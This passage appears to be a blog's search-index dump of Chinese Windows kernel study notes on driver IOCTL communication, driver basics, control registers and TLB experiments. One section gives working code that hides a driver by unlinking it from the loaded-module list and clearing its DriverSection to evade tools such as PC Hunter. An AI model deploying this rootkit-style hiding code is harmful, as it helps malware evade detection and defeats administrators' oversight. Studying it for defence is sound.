CTL_CODE(FILE_DEVICE_UNKNOWN, CODE_CTR_INDEX+2, METHOD_BUFFERED, FILE_ANY_ANY_ACCESS)#define GET_BASE_DLL CTL_CODE(FILE_DEVICE_UNKNOWN, CODE_CTR_INDEX+3, METHOD_BUFFERED, FILE_ANY_ANY_ACCESS)#define SET_PROTECT_PID CTL_CODE(FILE_DEVICE_UNKNOWN, CODE_CTR_INDEX+4, METHOD_BUFFERED, FILE_ANY_ANY_ACCESS) 创建符号链接123456NTKERNELAPINTSTATUSIoCreateSymbolicLink( _In_ PUNICODE_STRING SymbolicLinkName, // 符号链接名称 _In_ PUNICODE_STRING DeviceName // 设备名称 ); 设置驱动派发回调函数 IRP_MJ_CREATE和IRP_MJ_CLOSE必须设置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// 创建设备开启/关闭回调函数NTSTATUS MyDriverCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) &#123; UNREFERENCED_PARAMETER(DeviceObject); Irp-&gt;IoStatus.Status = STATUS_SUCCESS; Irp-&gt;IoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return STATUS_SUCCESS;&#125;// 处理 IOCTL 请求NTSTATUS MyDriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) &#123; // 当前栈 PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp); // 自定义控制码 ULONG controlCode = stack-&gt;Parameters.DeviceIoControl.IoControlCode; NTSTATUS status = STATUS_SUCCESS; ULONG_PTR information = 0; switch (controlCode) &#123; case IOCTL_MY_CONTROL_CODE: &#123; // 获取输入输出缓冲区（假设用 METHOD_BUFFERED 方法） PVOID inputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer; // 输入 PVOID outputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer; // 输出 ULONG inputBufferLength = stack-&gt;Parameters.DeviceIoControl.InputBufferLength; ULONG outputBufferLength = stack-&gt;Parameters.DeviceIoControl.OutputBufferLength; // 示例：简单地将接收到的输入数据拷贝到输出缓冲区 if (inputBufferLength &gt; 0 &amp;&amp; outputBufferLength &gt;= inputBufferLength) &#123; RtlCopyMemory(outputBuffer, inputBuffer, inputBufferLength); information = inputBufferLength; // 返回数据的长度 KdPrint((&quot;Received from user: %s\\n&quot;, (char*)inputBuffer)); &#125; else &#123; status = STATUS_BUFFER_TOO_SMALL; &#125; break; &#125; default: status = STATUS_INVALID_DEVICE_REQUEST; break; &#125; Irp-&gt;IoStatus.Status = status; Irp-&gt;IoStatus.Information = information; IoCompleteRequest(Irp, IO_NO_INCREMENT); return status;&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)&#123; ... // 设置驱动的卸载例程和设备控制例程 DriverObject-&gt;DriverUnload = UnloadDriver; DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyDriverCreate; // 默认派发, 允许打开 DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyDriverCreate; // 默认派发, 允许关闭 DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDriverDeviceControl;&#125; 驱动完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include &lt;ntddk.h&gt;// 定义设备名称和符号链接#define DEVICE_NAME L&quot;\\\\Device\\\\MyUniqueDevice&quot;#define SYM_LINK_NAME L&quot;\\\\DosDevices\\\\MyUniqueDevice&quot; // \\\\??\\\\ 等价于\\\\DosDevices\\\\， \\\\DosDevices\\\\兼容性更高// 定义 IOCTL 控制码#define IOCTL_MY_CONTROL_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)// 创建设备回调函数NTSTATUS MyDriverCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) &#123; UNREFERENCED_PARAMETER(DeviceObject); Irp-&gt;IoStatus.Status = STATUS_SUCCESS; Irp-&gt;IoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return STATUS_SUCCESS;&#125;// 驱动卸载函数void UnloadDriver(PDRIVER_OBJECT DriverObject) &#123; UNICODE_STRING symLink = RTL_CONSTANT_STRING(SYM_LINK_NAME); IoDeleteSymbolicLink(&amp;symLink); // 删除符号链接 IoDeleteDevice(DriverObject-&gt;DeviceObject); // 删除设备对象 KdPrint((&quot;-----------DriverUnloaded-----------\\n&quot;));&#125;// 处理 IOCTL 请求NTSTATUS MyDriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) &#123; // 当前栈 PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp); // 自定义控制码 ULONG controlCode = stack-&gt;Parameters.DeviceIoControl.IoControlCode; NTSTATUS status = STATUS_SUCCESS; ULONG_PTR information = 0; switch (controlCode) &#123; case IOCTL_MY_CONTROL_CODE: &#123; // 获取输入输出缓冲区（假设用 METHOD_BUFFERED 方法） PVOID inputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer; PVOID outputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer; ULONG inputBufferLength = stack-&gt;Parameters.DeviceIoControl.InputBufferLength; ULONG outputBufferLength = stack-&gt;Parameters.DeviceIoControl.OutputBufferLength; // 示例：简单地将接收到的输入数据拷贝到输出缓冲区 if (inputBufferLength &gt; 0 &amp;&amp; outputBufferLength &gt;= inputBufferLength) &#123; RtlCopyMemory(outputBuffer, inputBuffer, inputBufferLength); information = inputBufferLength; // 返回数据的长度 KdPrint((&quot;Received from user: %s\\n&quot;, (char*)inputBuffer)); &#125; else &#123; status = STATUS_BUFFER_TOO_SMALL; &#125; break; &#125; default: status = STATUS_INVALID_DEVICE_REQUEST; break; &#125; Irp-&gt;IoStatus.Status = status; Irp-&gt;IoStatus.Information = information; IoCompleteRequest(Irp, IO_NO_INCREMENT); return status;&#125;// 驱动入口NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) &#123; UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS status; PDEVICE_OBJECT deviceObject = NULL; UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DEVICE_NAME); UNICODE_STRING symLink = RTL_CONSTANT_STRING(SYM_LINK_NAME); // 创建设备对象 status = IoCreateDevice(DriverObject, 0, &amp;deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &amp;deviceObject); if (!NT_SUCCESS(status)) &#123; KdPrint((&quot;Failed to create device\\n&quot;)); return status; &#125; // 创建符号链接 status = IoCreateSymbolicLink(&amp;symLink, &amp;deviceName); if (!NT_SUCCESS(status)) &#123; IoDeleteDevice(deviceObject); KdPrint((&quot;Failed to create symbolic link\\n&quot;)); return status; &#125; // 设置驱动的卸载例程和设备控制例程 DriverObject-&gt;DriverUnload = UnloadDriver; DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyDriverCreate; // 默认派发, 允许打开 DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyDriverCreate; // 默认派发, 允许关闭 DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDriverDeviceControl; KdPrint((&quot;Driver loaded successfully\\n&quot;)); return STATUS_SUCCESS;&#125; 用户态完整代码1234567891011121314151617181920212223242526272829303132333435363738// 11_01_R3_Communicate(3环通信).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;windows.h&gt;#include &lt;winioctl.h&gt;#include &lt;stdio.h&gt;// 自定义控制码#define IOCTL_MY_CONTROL_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)int main() &#123; // 创建设备 HANDLE hDevice = CreateFile(L&quot;\\\\\\\\.\\\\MyUniqueDevice&quot;, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice == INVALID_HANDLE_VALUE) &#123; printf(&quot;Failed to open device. Error: %d\\n&quot;, GetLastError()); system(&quot;pause&quot;); return 1; &#125; char inputBuffer[100] = &quot;Hello, driver!&quot;; char outputBuffer[100] = &#123; 0 &#125;; DWORD bytesReturned; // 使用DeviceIoControl打开设备并通过自定义控制码发送和接收数据 BOOL success = DeviceIoControl(hDevice, IOCTL_MY_CONTROL_CODE, inputBuffer, sizeof(inputBuffer), outputBuffer, sizeof(outputBuffer), &amp;bytesReturned, NULL); if (success) &#123; printf(&quot;Received from driver: %s\\n&quot;, outputBuffer); &#125; else &#123; printf(&quot;DeviceIoControl failed. Error: %d\\n&quot;, GetLastError()); &#125; CloseHandle(hDevice); system(&quot;pause&quot;); return 0;&#125; 使用ReadFile进行通信驱动代码1234567891011121314151617181920212223242526272829303132333435363738394041// 处理读取回调函数NTSTATUS MyDriverDeviceReadControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) &#123; UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp); ULONG bufferLength = stack-&gt;Parameters.Read.Length; NTSTATUS status = STATUS_SUCCESS; // 准备要发送到用户态的数据 const char* message = &quot;Hello From Kernel!&quot;; ULONG messageLength = (ULONG)strlen(message) + 1; // 检查缓冲区大小 if (bufferLength &lt; messageLength) &#123; status = STATUS_BUFFER_TOO_SMALL; Irp-&gt;IoStatus.Information = 0; &#125; else &#123; // 将数据复制到用户态缓冲区 RtlCopyMemory(Irp-&gt;AssociatedIrp.SystemBuffer, message, messageLength); Irp-&gt;IoStatus.Information = messageLength; // 返回数据长度 &#125; Irp-&gt;IoStatus.Status = status; IoCompleteRequest(Irp, IO_NO_INCREMENT); return status;&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)&#123; // 创建设备 ... deviceObject-&gt;Flags |= DO_BUFFERED_IO; // 创建符号链接 ... // 设置回调函数 DriverObject-&gt;DriverUnload = UnloadDriver; DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyDriverCreate; // 默认派发, 允许打开 DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyDriverCreate; // 默认派发, 允许关闭 DriverObject-&gt;MajorFunction[IRP_MJ_READ] = MyDriverDeviceReadControl;&#125; 用户态代码12345678910111213141516171819202122232425262728293031323334// 11_01_R3_Communicate(3环通信).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;windows.h&gt;#include &lt;winioctl.h&gt;#include &lt;stdio.h&gt;#define IOCTL_MY_CONTROL_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)int main() &#123; // 创建设备 HANDLE hDevice = CreateFile(TEXT(&quot;\\\\\\\\.\\\\MyUniqueDevice&quot;), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDevice == INVALID_HANDLE_VALUE) &#123; printf(&quot;Failed to open device. Error: %d\\n&quot;, GetLastError()); system(&quot;pause&quot;); return 1; &#125; char buffer[100] = &#123; 0 &#125;; DWORD bytesRead; // 使用 ReadFile 从驱动读取数据 BOOL success = ReadFile(hDevice, buffer, sizeof(buffer), &amp;bytesRead, NULL); if (success) &#123; printf(&quot;Received from driver: %s\\n&quot;, buffer); &#125; else &#123; printf(&quot;ReadFile failed. Error: %d\\n&quot;, GetLastError()); &#125; CloseHandle(hDevice); system(&quot;pause&quot;); return 0;&#125; 通信方式1234#define METHOD_BUFFERED 0 // 缓冲模式, 复制一份数据#define METHOD_IN_DIRECT 1 // 映射同一个物理地址, 共享物理地址#define METHOD_OUT_DIRECT 2 // #define METHOD_NEITHER 3 // 直写 驱动通信封装步骤 注册通信方法 销毁的方法 发送通知 注意在使用WriteFile时第四个参数不能使用LPDWORD指针类型直接传参, 会导致程序奔溃, 需要使用DWORD类型然后传递指针;","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-驱动开发","slug":"Windows内核-驱动开发","date":"2024-10-24T01:03:39.000Z","updated":"2024-11-01T00:33:36.445Z","comments":true,"path":"b57f2803.html","link":"","permalink":"http://example.com/b57f2803.html","excerpt":"驱动开发","text":"驱动开发 知识点驱动是进程吗 驱动并不是进程, 而是叫模块（本质上和dll是一样的）; 驱动类型 NT: NT4虚拟驱动（现在基本没有纯NT4的驱动）;WDM: 是一个热拔插方式;WDF: 简化开发, 相当于事件驱动机制; KWDF（内核驱动框架）, UWDF（用户驱动框架）; 加载驱动 服务加载OpenSrcManagerCreateServiceStartServiceStopServiceDeleteService 本地加载Zw&#x2F;NtLoadDriverZw&#x2F;NtUnloadDriver 驱动基础知识点类型 int &#x3D;&gt; INT short &#x3D;&gt; SHORT long &#x3D;&gt; LONG 字符串函数, 申请内存函数字符串操作 RtlInitString: 初始化多字节ascii RtlInitUnicodeString: 初始化宽字符 RtlFreeUnicodeString: 释放unicode字符串 RtlStringCbPrintfA: 格式化输出, 引用#include &lt;ntstrsafe.h&gt; RtlCompareUnicodeString: 字符串比较 内存操作 ExAllocatePool（内存申请）NonPagedPool &#x3D;&gt; 非分页内存（带执行属性）PagedPool &#x3D;&gt; 分页内存（不带执行属性） ExFreePool（释放内存） 创建线程 PsCreateSystemThread（创建线程） 123456789101112// 回调函数VOID work(PVOID StartContext)&#123;&#125;HANDLE hThread = NULL;NTSTATUS status = PsCreateSystemThread(&amp;hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, work, NULL);if (NT_SUCCESS(status))&#123; ZwClose(hThread);&#125; 普通链表API InitializeListHead（初始化链表）IsListEmpty（判断链表是否为空）InsertHeadList（链表头部插入数据）InsertTailList（链表尾部插入数据）RemoveHeadList（移除链表头部数据）RemoveTailList（移除链表尾部数据）RemoveEntryList（移除空链表） 驱动遍历代码实验1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;ntifs.h&gt;typedef struct _KLDR_DATA_TABLE_ENTRY &#123; LIST_ENTRY InLoadOrderLinks; ULONG __Undefined1; ULONG __Undefined2; ULONG __Undefined3; ULONG NonPagedDebugInfo; ULONG DllBase; ULONG EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; USHORT LoadCount; USHORT __Undefined5; ULONG __Undefined6; ULONG CheckSum; ULONG TimeDateStamp;&#125; KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;void DriverUnload(PDRIVER_OBJECT pDriver)&#123; DbgPrintEx(77, 0, &quot;-----------DriverUnload-----------&quot;);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)&#123; // DbgBreakPoint(); // 遍历驱动 PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection; PKLDR_DATA_TABLE_ENTRY pre = (PKLDR_DATA_TABLE_ENTRY)ldr-&gt;InLoadOrderLinks.Flink; PKLDR_DATA_TABLE_ENTRY next = (PKLDR_DATA_TABLE_ENTRY)pre-&gt;InLoadOrderLinks.Flink; while (next != pre) &#123; DbgPrintEx(77, 0, &quot;[db]: Driver Name = %wZ\\r\\n&quot;, &amp;next-&gt;FullDllName); next = (PKLDR_DATA_TABLE_ENTRY)next-&gt;InLoadOrderLinks.Flink; &#125; pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125; 驱动断链结构1234567891011121314151617kd&gt; dt _DRIVER_OBJECTntdll!_DRIVER_OBJECT +0x000 Type : Int2B +0x002 Size : Int2B +0x004 DeviceObject : Ptr32 _DEVICE_OBJECT +0x008 Flags : Uint4B +0x00c DriverStart : Ptr32 Void +0x010 DriverSize : Uint4B +0x014 DriverSection : Ptr32 Void // 链表 +0x018 DriverExtension : Ptr32 _DRIVER_EXTENSION +0x01c DriverName : _UNICODE_STRING +0x024 HardwareDatabase : Ptr32 _UNICODE_STRING +0x028 FastIoDispatch : Ptr32 _FAST_IO_DISPATCH +0x02c DriverInit : Ptr32 long +0x030 DriverStartIo : Ptr32 void +0x034 DriverUnload : Ptr32 void +0x038 MajorFunction : [28] Ptr32 long 实验代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#include &lt;ntifs.h&gt;typedef struct _KLDR_DATA_TABLE_ENTRY &#123; LIST_ENTRY InLoadOrderLinks; ULONG __Undefined1; ULONG __Undefined2; ULONG __Undefined3; ULONG NonPagedDebugInfo; ULONG DllBase; ULONG EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; USHORT LoadCount; USHORT __Undefined5; ULONG __Undefined6; ULONG CheckSum; ULONG TimeDateStamp;&#125; KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;NTKERNELAPI NTSTATUS ObReferenceObjectByName( __in PUNICODE_STRING ObjectName, __in ULONG Attributes, __in_opt PACCESS_STATE AccessState, __in_opt ACCESS_MASK DesiredAccess, __in POBJECT_TYPE ObjectType, __in KPROCESSOR_MODE AccessMode, __inout_opt PVOID ParseContext, __out PVOID *Object);extern POBJECT_TYPE * IoDriverObjectType;void DriverHide(PWCH wcObjectName)&#123; LARGE_INTEGER in = &#123; 0 &#125;; in.QuadPart = -10000 * 5000; KeDelayExecutionThread(KernelMode, FALSE, &amp;in); UNICODE_STRING usDriverName = &#123; 0 &#125;; RtlInitUnicodeString(&amp;usDriverName, wcObjectName); PDRIVER_OBJECT pDriverObject = NULL; NTSTATUS status = ObReferenceObjectByName(&amp;usDriverName, FILE_ALL_ACCESS, 0, 0, IoDriverObjectType, KernelMode, NULL, &amp;pDriverObject); if (NT_SUCCESS(status)) &#123; PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriverObject-&gt;DriverSection; DbgPrintEx(77, 0, &quot;[db]: Driver Name = %wZ\\r\\n&quot;, &amp;ldr-&gt;FullDllName); // pDriverObject-&gt;DriverSection = ldr-&gt;InLoadOrderLinks.Flink; // 修复pc hunter 卡死（移花接木） RemoveEntryList(&amp;ldr-&gt;InLoadOrderLinks); pDriverObject-&gt;DriverInit = NULL; pDriverObject-&gt;DriverSection = NULL; ObDereferenceObject(pDriverObject); // 引用计数清除 &#125; else &#123; DbgPrintEx(77, 0, &quot;DriverHide ObReferenceObjectByName Failed&quot;); &#125; return;&#125;void DriverUnload(PDRIVER_OBJECT pDriver)&#123; DbgPrintEx(77, 0, &quot;-----------DriverUnload-----------&quot;);&#125;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)&#123; // 断链隐藏自身 HANDLE hThread = NULL; NTSTATUS status = PsCreateSystemThread(&amp;hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, DriverHide, &quot;\\\\drivers\\\\MyDriver3&quot;); if (NT_SUCCESS(status)) &#123; NtClose(hThread); &#125; // 有BUG /* DbgBreakPoint(); PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection; PKLDR_DATA_TABLE_ENTRY pre = (PKLDR_DATA_TABLE_ENTRY)ldr-&gt;InLoadOrderLinks.Flink; PKLDR_DATA_TABLE_ENTRY next = (PKLDR_DATA_TABLE_ENTRY)pre-&gt;InLoadOrderLinks.Flink; UNICODE_STRING usDriverName1 = &#123; 0 &#125;; RtlInitUnicodeString(&amp;usDriverName1, L&quot;\\\\drivers\\\\http&quot;); UNICODE_STRING usDriverName = &#123; 0 &#125;; RtlInitUnicodeString(&amp;usDriverName, L&quot;http.sys&quot;); while (next != pre) &#123; // DbgPrintEx(77, 0, &quot;[db]: Driver Name = %wZ\\r\\n&quot;, &amp;next-&gt;FullDllName); if (next-&gt;BaseDllName.Length != 0 &amp;&amp; RtlCompareUnicodeString(&amp;usDriverName, &amp;next-&gt;BaseDllName, TRUE) == 0) &#123; PDRIVER_OBJECT pDriverObject = NULL; NTSTATUS status = ObReferenceObjectByName(&amp;usDriverName1, FILE_ALL_ACCESS, 0, 0, IoDriverObjectType, KernelMode, NULL, &amp;pDriverObject); if (NT_SUCCESS(status)) &#123; pDriverObject-&gt;DriverInit = NULL; pDriverObject-&gt;DriverSection = NULL; // pDriverObject-&gt;Type = 0; // 规避暴露搜索 &#125; else &#123; DbgPrintEx(77, 0, &quot;DriverHide ObReferenceObjectByName Failed&quot;); &#125; DbgPrintEx(77, 0, &quot;[db]: Driver Name = %wZ\\r\\n&quot;, &amp;next-&gt;FullDllName); RemoveEntryList(&amp;next-&gt;InLoadOrderLinks); break; &#125; next = (PKLDR_DATA_TABLE_ENTRY)next-&gt;InLoadOrderLinks.Flink; &#125; */ pDriver-&gt;DriverUnload = DriverUnload; return STATUS_SUCCESS;&#125;","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-控制寄存器","slug":"Windows内核-控制寄存器","date":"2024-10-21T15:35:45.000Z","updated":"2024-10-21T16:14:51.473Z","comments":true,"path":"fefdec16.html","link":"","permalink":"http://example.com/fefdec16.html","excerpt":"控制寄存器","text":"控制寄存器 知识点CR2 CR2寄存器（内存有问题）保存了出异常的线性地址; CR3PCD 当PCD位为1的时候, 整个页表的缓存全关; PWT 当PWT位为1的时候, 代表只写（优化性能）; CR0PE 开启保护模式, 但是没有分页保护, 只有段保护; PG 开启分页模式; PE和PG组合PE &#x3D; 0, PG &#x3D; 1 &#x3D;&gt; 错误的PE &#x3D; 0, PG &#x3D; 0 &#x3D;&gt; 正确的（实模式）PE &#x3D; 1, PG &#x3D; 0 &#x3D;&gt; 正确的（段模式）PE &#x3D; 1, PG &#x3D; 1 &#x3D;&gt; 正确的（段页模式） CD 关闭缓存; 如果CD位为1, 所有进程的页表缓存通通关闭; AM 当AM位置为1时, 三环的应用程序必须经过对齐检查（堆栈在32位下必须是4字节对齐, 在64位下必须是8字节对齐） WP 关闭写保护, 不可写的地址变为可写; CR4VME 开启虚拟中断, 并且允许开启虚拟8086模式; PVI 当PVI位为1时, 允许虚拟8086模式支持虚拟化中断; TSD DE PSE 当PSE位为0时, 就算PDE.ps &#x3D; 1也是小页; 控制所有大页的开关是否有效 PAE 在32位下, 如果PAE位为1, 表示分页模式为2-9-9-12模式; 否则为10-10-12模式; MCE 机器检查 PGE 如果PGE &#x3D; 1, G &#x3D; 1代表全局页有效; 如果PGE &#x3D; 0, G &#x3D; 1代表无效; PCE VMXE VT的开启位, 进入VT之后这个位必须为1 SMXE 上帝模式 SMEP super mode execute protected SMAP super mode access protected PKE 页表密钥","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-缓存","slug":"Windows内核-缓存","date":"2024-10-19T01:34:43.000Z","updated":"2024-10-21T15:33:52.680Z","comments":true,"path":"b89f0cae.html","link":"","permalink":"http://example.com/b89f0cae.html","excerpt":"缓存","text":"缓存 知识点WC（写组合&#x2F;写合并） 同一时刻只能保证4个地址; WB（写回绕&#x2F;回写） WT（直写） 通常是做多媒体 实验代码 课程中test1比test2快, 实验是test2比test1快??? 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394// 10_19_Cache(缓存).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;#define ALLOCATE_SIZE 0x10000#define MASK (ALLOCATE_SIZE - 1)void test1()&#123; PUCHAR x1 = (PUCHAR)malloc(ALLOCATE_SIZE); PUCHAR x2 = (PUCHAR)malloc(ALLOCATE_SIZE); PUCHAR x3 = (PUCHAR)malloc(ALLOCATE_SIZE); PUCHAR x4 = (PUCHAR)malloc(ALLOCATE_SIZE); PUCHAR x5 = (PUCHAR)malloc(ALLOCATE_SIZE); PUCHAR x6 = (PUCHAR)malloc(ALLOCATE_SIZE); int startTime = GetTickCount(); int i = INT_MAX; while (i--) &#123; int index = i &amp; MASK; char b = i; x1[index] = b; x2[index] = b; x3[index] = b; &#125; int j = INT_MAX; while (j--) &#123; int index = j &amp; MASK; char b = j; x4[index] = b; x5[index] = b; x6[index] = b; &#125; int endTime = GetTickCount(); printf(&quot;1. 一共耗时%d毫秒\\r\\n&quot;, endTime - startTime); free(x1); free(x2); free(x3); free(x4); free(x5); free(x6);&#125;void test2()&#123; PUCHAR x1 = (PUCHAR)malloc(ALLOCATE_SIZE); PUCHAR x2 = (PUCHAR)malloc(ALLOCATE_SIZE); PUCHAR x3 = (PUCHAR)malloc(ALLOCATE_SIZE); PUCHAR x4 = (PUCHAR)malloc(ALLOCATE_SIZE); PUCHAR x5 = (PUCHAR)malloc(ALLOCATE_SIZE); PUCHAR x6 = (PUCHAR)malloc(ALLOCATE_SIZE); int startTime = GetTickCount(); int i = INT_MAX; while (i--) &#123; int index = i &amp; MASK; char b = i; x1[index] = b; x2[index] = b; x3[index] = b; x4[index] = b; x5[index] = b; x6[index] = b; &#125; int endTime = GetTickCount(); printf(&quot;2. 一共耗时%d毫秒\\r\\n&quot;, endTime - startTime); free(x1); free(x2); free(x3); free(x4); free(x5); free(x6);&#125;int main()&#123; test1(); test2(); test1(); test2(); test1(); test2(); system(&quot;pause&quot;); return 0;&#125; PATTLB 每个核有4个TLB, 2个数据核（dTLB）, 2个指令TLB（iTLB）; 实验步骤 申请2个地址, 分别赋值; 把第一个地址挂在0地址上, 然后访问, 取出结果保存变量; 又把第二个地址挂在0地址上, 然后访问, 取出结果也保存变量; 观察变量1, 变量2有什么不同; 401080gdtr: 0040ec00&#96;00081080 实验代码 代码出现问题, 获取0地址时为0; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788// 10_21_TLB.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;PUCHAR addr1 = NULL;PUCHAR addr2 = NULL;ULONG temp1 = 0, temp2 = 0;void __declspec(naked) test()&#123; __asm &#123; pushad; pushfd; push 0x30; pop fs; mov eax, [addr1]; // 线形地址1, 使用原始汇编代码, 注释代码会导致系统蓝屏 shr eax, 0x9; and eax, 0x7ffff8; mov ecx, [eax-0x3FFFFFFC]; sub eax, 0x40000000; mov ecx, [eax]; mov edx, [eax + 4]; //and eax, 0xC0000000; //int 3; //mov ecx, [eax]; // 取低4字节 //mov edx, [eax + 4]; // 取高4字节 mov dword ptr ds:[0xC0000000], ecx; mov dword ptr ds:[0xC0000004], edx; mov eax, dword ptr ds:[0]; int 3; mov [temp1], eax; mov eax, cr3; //刷新cr3 mov cr3, eax; // 刷新cr3 //mov eax, [addr2]; // 线形地址2 //shr eax, 0x9; //and eax, 0x7ffff8; //and eax, 0xC0000000; //mov ecx, [eax]; // 取低4字节 //mov edx, [eax + 4]; // 取高4字节 //mov dword ptr ds : [0xC0000000], ecx; //mov dword ptr ds : [0xC0000004], edx; //mov eax, dword ptr ds : [0]; //mov [temp2], eax; push 0x3b; pop fs; popfd; popad; retf; &#125;&#125;int main()&#123; addr1 = (PUCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE); addr2 = (PUCHAR)VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE); *(PUCHAR)addr1 = 0x1000; *(PUCHAR)addr2 = 0x2000; temp1 = 0; temp2 = 0; printf(&quot;addr1 = %x, addr2 = %x, test = %x\\r\\n&quot;, addr1, addr2, test); system(&quot;pause&quot;); char bufcode[6] = &#123; 0,0,0,0,0x4b,0 &#125;; __asm &#123; // push fs; call fword ptr bufcode; // pop fs; &#125; printf(&quot;temp1 = %x, temp2 = %x\\r\\n&quot;, temp1, temp2); system(&quot;pause&quot;); return 0;&#125; 刷新CR3 当切换CR3的时候, CPU就认为在切换不同的页表; 当页表发生变化的时候, TLB就会产生一个刷新; 凡是G位等于0的通通刷新掉; 刷新除G位为1的情况;切换线程的时候, 判断当前被切换与切换是否是一个进程, 如果不是, 会切换页表（CR3）; 12mov eax, cr3; //刷新cr3mov cr3, eax; // 刷新cr3 把地址变为无效缓存; 刷新一条 1invlpg dword ptr ds:[0]; // 强制刷新TLB中某一行 CR4控制寄存器中有一个PGE位, 这个是控制所有的G位是否有效; 刷新所有;","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-页下","slug":"Windows内核-页下","date":"2024-10-17T01:01:28.000Z","updated":"2024-10-17T15:48:19.838Z","comments":true,"path":"2d7503f2.html","link":"","permalink":"http://example.com/2d7503f2.html","excerpt":"页表基址","text":"页表基址 知识点 线性地址和物理地址是一对一映射关系, 等价映射; 每个进程在高地址中有4兆空间是不共享的, 他指向的是本进程的PDE和PTE; 判断一个线性地址是否有效？ 如果是PDE.p &#x3D; 1并且PS&#x3D;1, 